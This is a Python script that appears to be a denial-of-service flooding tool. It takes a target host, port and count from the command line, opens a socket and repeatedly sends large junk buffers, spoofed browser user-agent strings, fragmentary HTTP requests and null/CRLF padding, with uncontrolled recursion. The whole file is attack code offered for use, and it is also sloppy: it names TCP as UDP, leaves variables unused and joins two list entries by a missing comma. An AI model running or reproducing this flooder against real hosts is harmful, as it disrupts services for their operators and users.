import socket
import time
import sys
import random
from tcp_latency import measure_latency
user_agent = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",]
def udp_at(host,port,packets,ttl):
	s = socket.socket()
	# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((host, port))
	except socket.gaierror:
		print("\nHostname not resolved!")
		sys.exit()
	except ConnectionRefusedError:
		print("Port {} closed or Target is offline".format(port))
		sys.exit()
	except ConnectionResetError:
		print("Connection was interrupted forcibly by Remote host!")
	data = b'packets' * 4000 
	data += b'packets'  * 4000 
	data += b'data' * 4000 
	data += b'packets' * 4000 
	x =  random.randint(10000,20000)
	data += b'x'
	data += b'packets' * 100
	f = random.choice(user_agent)
	f1 = random.choice(user_agent)
	f2 = random.choice(user_agent)
	f3 = random.choice(user_agent)
	f4 = random.choice(user_agent)
	f5 = random.choice(user_agent)
	f6 = random.choice(user_agent)
	f78 = random.choice(user_agent)  
	request = b'19999'
	syn = b'Hello Worlddd'
	ack = b'19999999999999999999999'
	su333 = request + syn + ack * 4000
	admin = 'admin\r\n\r\n\r'
	kkk = '\x00\x33\x44\x55\x66\x77\x88\x99\x00' + '\r\n\r\n\r' * 500 + admin
	def lol():
		for packets in range(ttl):
			print("Packets sent!")
			try:
				v = measure_latency(host=host)
				print("Latency - {}".format(v))
				s.send(data)
				s.send(f.encode())
				print("Sent user agent.. - {}".format(f))
				s.send(f1.encode())
				print("Sent user agent.. - {}".format(f1))
				s.send(f2.encode())
				print('Sent user agent.. - {}'.format(f2))
				s.send(f"GET /?382931 HTTP/1.1".encode())
				print('Sent user agent..')
				s.send(f"GET /?382831 HTTP/1.1".encode())
				print("Sent user agent..")
				s.send(b"X-a")
				print('Sent header')
				s.send(f3.encode())
				print('Sent user agent.. - {}'.format(f3))
				s.send(f4.encode())
				print('Sent user agent.. - {}'.format(f4))
				s.send(f5.encode())
				print('Sent user agent.. - {}'.format(f5))
				s.send(f6.encode())
				print("Sent user agent.. - {}".format(f6))
				s.send(f78.encode())
				print("Sent user agent... - {}".format(f78))
				s.send(su333)
				print('Sent data...')
				s.send(kkk.encode())
				print("Payload sent..")
				lol()
			except ConnectionResetError:
				print("Failed Sending packets..")
				pass 
			except ConnectionAbortedError:
				print("Failed sending packets..")
				pass 
			except KeyboardInterrupt:
				sys.exit()
	lol()
def main():
	try:
		host = sys.argv[1]
		port = (int(sys.argv[2]))
		packets = (int(sys.argv[3]))
		ttl = (int(sys.argv[4]))
		udp_at(host,port,packets,ttl)
	except IndexError:
		print("\nUsage: ")
		print("python3 {} <ip> <port> <packets> <ttl> ".format(sys.argv[0]))
		sys.exit()
main()